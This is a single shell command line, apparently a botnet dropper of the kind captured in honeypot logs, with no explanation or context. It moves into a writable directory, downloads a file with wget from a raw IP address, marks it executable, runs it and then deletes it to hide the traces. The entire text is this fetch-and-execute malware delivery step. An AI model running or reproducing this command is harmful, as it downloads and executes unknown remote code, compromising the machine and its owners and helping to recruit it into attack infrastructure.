cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.76.87.213/' '; chmod +x ' '; ./' '; rm -rf ' '
